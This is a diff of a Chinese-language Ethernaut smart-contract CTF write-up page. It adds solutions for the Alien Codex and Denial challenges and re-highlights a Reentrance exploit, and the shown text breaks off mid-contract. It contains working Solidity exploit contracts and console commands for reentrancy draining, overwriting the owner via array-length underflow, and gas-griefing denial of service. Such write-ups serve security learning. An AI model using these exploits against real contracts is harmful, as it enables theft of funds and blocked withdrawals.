@@ -1376,6 +1376,48 @@ var _hmt = _hmt || [];
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#alien-codex" class="md-nav__link">
+    Alien Codex
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#denial" class="md-nav__link">
+    Denial
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shop" class="md-nav__link">
+    Shop
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dex-dex-two" class="md-nav__link">
+    Dex &amp; Dex Two
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puzzle-wallet" class="md-nav__link">
+    Puzzle Wallet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#motorbike" class="md-nav__link">
+    Motorbike
+  </a>
+  
+</li>
+        
       </ul>
     
   </nav>
@@ -1657,6 +1699,48 @@ var _hmt = _hmt || [];
           <li class="md-nav__item">
   <a href="#magicnumber" class="md-nav__link">
     MagicNumber
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#alien-codex" class="md-nav__link">
+    Alien Codex
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#denial" class="md-nav__link">
+    Denial
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#shop" class="md-nav__link">
+    Shop
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dex-dex-two" class="md-nav__link">
+    Dex &amp; Dex Two
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#puzzle-wallet" class="md-nav__link">
+    Puzzle Wallet
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#motorbike" class="md-nav__link">
+    Motorbike
   </a>
   
 </li>
@@ -2080,25 +2164,25 @@ var _hmt = _hmt || [];
 <p>先通过 <code class="highlight"><span class="k">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span></code> 得到目标合约中的 balance 为 0.001 ether，所以每次 withdraw 0.001 ether 就好</p>
 <details class="done" open="open">
 <summary>exp</summary>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="__codelineno-15-1"></a>// SPDX-License-Identifier: MIT
-<a id="__codelineno-15-2" name="__codelineno-15-2" href="__codelineno-15-2"></a>pragma solidity ^0.6.0;
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="__codelineno-15-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="__codelineno-15-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
 <a id="__codelineno-15-3" name="__codelineno-15-3" href="__codelineno-15-3"></a>
-<a id="__codelineno-15-4" name="__codelineno-15-4" href="__codelineno-15-4"></a>/* code of Reentrance */
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="__codelineno-15-4"></a><span class="cm">/* code of Reentrance */</span><span class="w"></span>
 <a id="__codelineno-15-5" name="__codelineno-15-5" href="__codelineno-15-5"></a>
-<a id="__codelineno-15-6" name="__codelineno-15-6" href="__codelineno-15-6"></a>contract Exploit {
-<a id="__codelineno-15-7" name="__codelineno-15-7" href="__codelineno-15-7"></a>    Reentrance challenge;
-<a id="__codelineno-15-8" name="__codelineno-15-8" href="__codelineno-15-8"></a>    constructor(address payable addr) public payable {
-<a id="__codelineno-15-9" name="__codelineno-15-9" href="__codelineno-15-9"></a>        challenge = Reentrance(addr);
-<a id="__codelineno-15-10" name="__codelineno-15-10" href="__codelineno-15-10"></a>    }
-<a id="__codelineno-15-11" name="__codelineno-15-11" href="__codelineno-15-11"></a>    function exp() public {
-<a id="__codelineno-15-12" name="__codelineno-15-12" href="__codelineno-15-12"></a>        challenge.withdraw(0.001 ether);
-<a id="__codelineno-15-13" name="__codelineno-15-13" href="__codelineno-15-13"></a>    }
-<a id="__codelineno-15-14" name="__codelineno-15-14" href="__codelineno-15-14"></a>    fallback() external payable {
-<a id="__codelineno-15-15" name="__codelineno-15-15" href="__codelineno-15-15"></a>        if (address(challenge).balance &gt;= 0) {
-<a id="__codelineno-15-16" name="__codelineno-15-16" href="__codelineno-15-16"></a>            challenge.withdraw(0.001 ether);
-<a id="__codelineno-15-17" name="__codelineno-15-17" href="__codelineno-15-17"></a>        }
-<a id="__codelineno-15-18" name="__codelineno-15-18" href="__codelineno-15-18"></a>    }
-<a id="__codelineno-15-19" name="__codelineno-15-19" href="__codelineno-15-19"></a>}
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="__codelineno-15-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="__codelineno-15-7"></a><span class="w">    </span>Reentrance<span class="w"> </span>challenge<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="__codelineno-15-8"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>addr<span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="__codelineno-15-9"></a><span class="w">        </span>challenge<span class="w"> </span><span class="o">=</span><span class="w"> </span>Reentrance<span class="p">(</span>addr<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="__codelineno-15-10"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="__codelineno-15-11"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">exp</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="__codelineno-15-12"></a><span class="w">        </span>challenge<span class="p">.</span>withdraw<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">001</span><span class="w"> </span>ether<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="__codelineno-15-13"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="__codelineno-15-14"></a><span class="w">    </span>fallback<span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="__codelineno-15-15"></a><span class="w">        </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span><span class="kt">address</span><span class="p">(</span>challenge<span class="p">).</span>balance<span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="__codelineno-15-16"></a><span class="w">            </span>challenge<span class="p">.</span>withdraw<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">001</span><span class="w"> </span>ether<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="__codelineno-15-17"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="__codelineno-15-18"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="__codelineno-15-19"></a><span class="p">}</span><span class="w"></span>
 </code></pre></div>
 </details>
 <p>首先直接部署合约，然后 <code class="highlight"><span class="nx">contract</span><span class="p">.</span><span class="nx">donate</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">(</span><span class="o">&lt;</span><span class="nx">exp</span> <span class="nx">contract</span> <span class="nx">addr</span><span class="o">&gt;</span><span class="p">,</span> <span class="p">{</span><span class="nx">value</span><span class="o">:</span> <span class="nx">toWei</span><span class="p">(</span><span class="s2">&quot;0.001&quot;</span><span class="p">)})</span></code> 先 donate 0.001 ether，然后调用 exp 函数就可以实现重入攻击提取出目标合约中的所有余额</p>
@@ -2628,9 +2712,563 @@ var _hmt = _hmt || [];
 <a id="__codelineno-37-4" name="__codelineno-37-4" href="__codelineno-37-4"></a><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setSolver</span><span class="p">(</span><span class="s2">&quot;&lt;contract address&gt;&quot;</span><span class="p">)</span>
 </code></pre></div>
 其中 contract address 通过访问给出的 etherscan 的网址就可以查到创建的合约地址</p>
-<!-- ---
-
-##  -->
+<hr />
+<h2 id="alien-codex">Alien Codex<a class="headerlink" href="#alien-codex" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="__codelineno-38-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="__codelineno-38-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.5.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-3" name="__codelineno-38-3" href="__codelineno-38-3"></a>
+<a id="__codelineno-38-4" name="__codelineno-38-4" href="__codelineno-38-4"></a><span class="kt">import</span><span class="w"> </span><span class="s1">&#39;../helpers/Ownable-05.sol&#39;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-5" name="__codelineno-38-5" href="__codelineno-38-5"></a>
+<a id="__codelineno-38-6" name="__codelineno-38-6" href="__codelineno-38-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">AlienCodex</span><span class="w"> </span><span class="kt">is</span><span class="w"> </span>Ownable<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-7" name="__codelineno-38-7" href="__codelineno-38-7"></a>
+<a id="__codelineno-38-8" name="__codelineno-38-8" href="__codelineno-38-8"></a><span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="k">public </span><span class="nv">contact</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-9" name="__codelineno-38-9" href="__codelineno-38-9"></a><span class="w">    </span><span class="kt">bytes32</span><span class="p">[]</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>codex<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-10" name="__codelineno-38-10" href="__codelineno-38-10"></a>
+<a id="__codelineno-38-11" name="__codelineno-38-11" href="__codelineno-38-11"></a><span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>contacted<span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-12" name="__codelineno-38-12" href="__codelineno-38-12"></a><span class="w">        </span>assert<span class="p">(</span>contact<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-38-13" name="__codelineno-38-13" href="__codelineno-38-13"></a><span class="w">        </span>_<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-14" name="__codelineno-38-14" href="__codelineno-38-14"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-38-15" name="__codelineno-38-15" href="__codelineno-38-15"></a>
+<a id="__codelineno-38-16" name="__codelineno-38-16" href="__codelineno-38-16"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">make_contact</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-17" name="__codelineno-38-17" href="__codelineno-38-17"></a><span class="w">        </span>contact<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-18" name="__codelineno-38-18" href="__codelineno-38-18"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-38-19" name="__codelineno-38-19" href="__codelineno-38-19"></a>
+<a id="__codelineno-38-20" name="__codelineno-38-20" href="__codelineno-38-20"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">record</span><span class="p">(</span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">_content</span><span class="p">)</span><span class="w"> </span>contacted<span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-21" name="__codelineno-38-21" href="__codelineno-38-21"></a><span class="w">        </span>codex<span class="p">.</span>push<span class="p">(</span>_content<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-38-22" name="__codelineno-38-22" href="__codelineno-38-22"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-38-23" name="__codelineno-38-23" href="__codelineno-38-23"></a>
+<a id="__codelineno-38-24" name="__codelineno-38-24" href="__codelineno-38-24"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">retract</span><span class="p">()</span><span class="w"> </span>contacted<span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-25" name="__codelineno-38-25" href="__codelineno-38-25"></a><span class="w">        </span>codex<span class="p">.</span>length<span class="o">--</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-26" name="__codelineno-38-26" href="__codelineno-38-26"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-38-27" name="__codelineno-38-27" href="__codelineno-38-27"></a>
+<a id="__codelineno-38-28" name="__codelineno-38-28" href="__codelineno-38-28"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">revise</span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">i</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes32</span><span class="w"> </span><span class="nv">_content</span><span class="p">)</span><span class="w"> </span>contacted<span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-38-29" name="__codelineno-38-29" href="__codelineno-38-29"></a><span class="w">        </span>codex<span class="p">[</span>i<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>_content<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-38-30" name="__codelineno-38-30" href="__codelineno-38-30"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-38-31" name="__codelineno-38-31" href="__codelineno-38-31"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>要求拿到合约的所有权，这个 owner 的存储是在 Ownable 中定义的，它会和 contact 一起放在 storage 的 slot 0 处，目的就是改变这个位置的值</p>
+<p>而 slot 1 的位置开始就是 codex 的存储，先是长度。所以可以通过调用 retract() 函数来使 length 向下溢出变成 2**256-1，也就可以访问到全部的 storage 区域，所以就只需要找到 slot 0 对应的 codex[i] 的 i</p>
+<p>因为 codex[i] 实际上是表示 keccak256(slot of codex) + i 处，所以只要令 i = 2**256 - keccak256(slot of codex) 就可以使其变为 2**256，即溢出到 0 的位置</p>
+<p>而 codex 的 slot 就是 1，所以只需要计算 2**256 - keccak256(1):
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="__codelineno-39-1"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="__codelineno-39-2"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">calc</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-39-3" name="__codelineno-39-3" href="__codelineno-39-3"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="nb">keccak256</span><span class="p">(</span>abi<span class="p">.</span>encode<span class="p">(</span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint</span><span class="p">(</span><span class="m m-Decimal">1</span><span class="p">))));</span><span class="w"></span>
+<a id="__codelineno-39-4" name="__codelineno-39-4" href="__codelineno-39-4"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-39-5" name="__codelineno-39-5" href="__codelineno-39-5"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+得到 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，用 2**256 减去它得到 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</p>
+<p>然后更改这个位置到 player 地址就好了（要在地址前面补上一堆 0 和 contact）
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="__codelineno-40-1"></a><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">retract</span><span class="p">()</span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="__codelineno-40-2"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
+<a id="__codelineno-40-3" name="__codelineno-40-3" href="__codelineno-40-3"></a><span class="s1">&#39;0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272&#39;</span>
+<a id="__codelineno-40-4" name="__codelineno-40-4" href="__codelineno-40-4"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">1</span><span class="p">)</span>
+<a id="__codelineno-40-5" name="__codelineno-40-5" href="__codelineno-40-5"></a><span class="s1">&#39;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#39;</span>
+<a id="__codelineno-40-6" name="__codelineno-40-6" href="__codelineno-40-6"></a><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">revise</span><span class="p">(</span><span class="s2">&quot;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&quot;</span><span class="p">,</span> <span class="s2">&quot;0x000000000000000000000001&lt;player address&gt;&quot;</span><span class="p">)</span>
+</code></pre></div></p>
+<hr />
+<h2 id="denial">Denial<a class="headerlink" href="#denial" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="__codelineno-41-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="__codelineno-41-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="__codelineno-41-3"></a>
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="__codelineno-41-4"></a><span class="kt">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-5" name="__codelineno-41-5" href="__codelineno-41-5"></a>
+<a id="__codelineno-41-6" name="__codelineno-41-6" href="__codelineno-41-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Denial</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-41-7" name="__codelineno-41-7" href="__codelineno-41-7"></a>
+<a id="__codelineno-41-8" name="__codelineno-41-8" href="__codelineno-41-8"></a><span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-9" name="__codelineno-41-9" href="__codelineno-41-9"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">partner</span><span class="p">;</span><span class="w"> </span><span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
+<a id="__codelineno-41-10" name="__codelineno-41-10" href="__codelineno-41-10"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="kt">constant</span><span class="w"> </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-41-11" name="__codelineno-41-11" href="__codelineno-41-11"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">timeLastWithdrawn</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-12" name="__codelineno-41-12" href="__codelineno-41-12"></a><span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">uint</span><span class="p">)</span><span class="w"> </span>withdrawPartnerBalances<span class="p">;</span><span class="w"> </span><span class="c1">// keep track of partners balances</span>
+<a id="__codelineno-41-13" name="__codelineno-41-13" href="__codelineno-41-13"></a>
+<a id="__codelineno-41-14" name="__codelineno-41-14" href="__codelineno-41-14"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">setWithdrawPartner</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_partner</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-41-15" name="__codelineno-41-15" href="__codelineno-41-15"></a><span class="w">        </span>partner<span class="w"> </span><span class="o">=</span><span class="w"> </span>_partner<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-16" name="__codelineno-41-16" href="__codelineno-41-16"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-41-17" name="__codelineno-41-17" href="__codelineno-41-17"></a>
+<a id="__codelineno-41-18" name="__codelineno-41-18" href="__codelineno-41-18"></a><span class="w">    </span><span class="c1">// withdraw 1% to recipient and 1% to owner</span>
+<a id="__codelineno-41-19" name="__codelineno-41-19" href="__codelineno-41-19"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">withdraw</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-41-20" name="__codelineno-41-20" href="__codelineno-41-20"></a><span class="w">        </span><span class="kt">uint</span><span class="w"> </span><span class="nv">amountToSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">.</span>div<span class="p">(</span><span class="m m-Decimal">100</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-41-21" name="__codelineno-41-21" href="__codelineno-41-21"></a><span class="w">        </span><span class="c1">// perform a call without checking return</span>
+<a id="__codelineno-41-22" name="__codelineno-41-22" href="__codelineno-41-22"></a><span class="w">        </span><span class="c1">// The recipient can revert, the owner will still get their share</span>
+<a id="__codelineno-41-23" name="__codelineno-41-23" href="__codelineno-41-23"></a><span class="w">        </span>partner<span class="p">.</span>call<span class="p">{</span>value<span class="p">:</span>amountToSend<span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-41-24" name="__codelineno-41-24" href="__codelineno-41-24"></a><span class="w">        </span>owner<span class="p">.</span>transfer<span class="p">(</span>amountToSend<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-41-25" name="__codelineno-41-25" href="__codelineno-41-25"></a><span class="w">        </span><span class="c1">// keep track of last withdrawal time</span>
+<a id="__codelineno-41-26" name="__codelineno-41-26" href="__codelineno-41-26"></a><span class="w">        </span>timeLastWithdrawn<span class="w"> </span><span class="o">=</span><span class="w"> </span>now<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-27" name="__codelineno-41-27" href="__codelineno-41-27"></a><span class="w">        </span>withdrawPartnerBalances<span class="p">[</span>partner<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>withdrawPartnerBalances<span class="p">[</span>partner<span class="p">].</span>add<span class="p">(</span>amountToSend<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-41-28" name="__codelineno-41-28" href="__codelineno-41-28"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-41-29" name="__codelineno-41-29" href="__codelineno-41-29"></a>
+<a id="__codelineno-41-30" name="__codelineno-41-30" href="__codelineno-41-30"></a><span class="w">    </span><span class="c1">// allow deposit of funds</span>
+<a id="__codelineno-41-31" name="__codelineno-41-31" href="__codelineno-41-31"></a><span class="w">    </span>receive<span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{}</span><span class="w"></span>
+<a id="__codelineno-41-32" name="__codelineno-41-32" href="__codelineno-41-32"></a>
+<a id="__codelineno-41-33" name="__codelineno-41-33" href="__codelineno-41-33"></a><span class="w">    </span><span class="c1">// convenience function</span>
+<a id="__codelineno-41-34" name="__codelineno-41-34" href="__codelineno-41-34"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">contractBalance</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>view<span class="w"> </span><span class="kt">returns</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-41-35" name="__codelineno-41-35" href="__codelineno-41-35"></a><span class="w">        </span><span class="kt">return</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-41-36" name="__codelineno-41-36" href="__codelineno-41-36"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-41-37" name="__codelineno-41-37" href="__codelineno-41-37"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>目的是要阻止 owner 在 withdraw 的时候提取到资产</p>
+<p>重入攻击没有打出来，但是可以通过让攻击合约的 fallback 触发 assert 异常，这样消耗掉所有的 gas 后就再没法正常向 owner 转账了</p>
+<details class="done" open="open">
+<summary>exp</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="__codelineno-42-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="__codelineno-42-2"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">^</span><span class="k">0.6.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-42-3" name="__codelineno-42-3" href="__codelineno-42-3"></a>
+<a id="__codelineno-42-4" name="__codelineno-42-4" href="__codelineno-42-4"></a><span class="cm">/* code of Denial */</span><span class="w"></span>
+<a id="__codelineno-42-5" name="__codelineno-42-5" href="__codelineno-42-5"></a>
+<a id="__codelineno-42-6" name="__codelineno-42-6" href="__codelineno-42-6"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Exploit</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-42-7" name="__codelineno-42-7" href="__codelineno-42-7"></a><span class="w">    </span>Denial<span class="w"> </span>challenge<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-42-8" name="__codelineno-42-8" href="__codelineno-42-8"></a><span class="w">    </span><span class="kt">constructor</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">payable</span><span class="w"> </span>addr<span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-42-9" name="__codelineno-42-9" href="__codelineno-42-9"></a><span class="w">        </span>challenge<span class="w"> </span><span class="o">=</span><span class="w"> </span>Denial<span class="p">(</span>addr<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-42-10" name="__codelineno-42-10" href="__codelineno-42-10"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-42-11" name="__codelineno-42-11" href="__codelineno-42-11"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">exp</span><span class="p">()</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-42-12" name="__codelineno-42-12" href="__codelineno-42-12"></a><span class="w">        </span>challenge<span class="p">.</span>setWithdrawPartner<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-42-13" name="__codelineno-42-13" href="__codelineno-42-13"></a><span class="w">        </span>challenge<span class="p">.</span>withdraw<span class="p">();</span><span class="w"></span>
+<a id="__codelineno-42-14" name="__codelineno-42-14" href="__codelineno-42-14"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-42-15" name="__codelineno-42-15" href="__codelineno-42-15"></a><span class="w">    </span>receive<span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-42-16" name="__codelineno-42-16" href="__codelineno-42-16"></a><span class="w">        </span>assert<span class="p">(</span><span class="kt">false</span><span class="p">);</span><span class="w"></span>
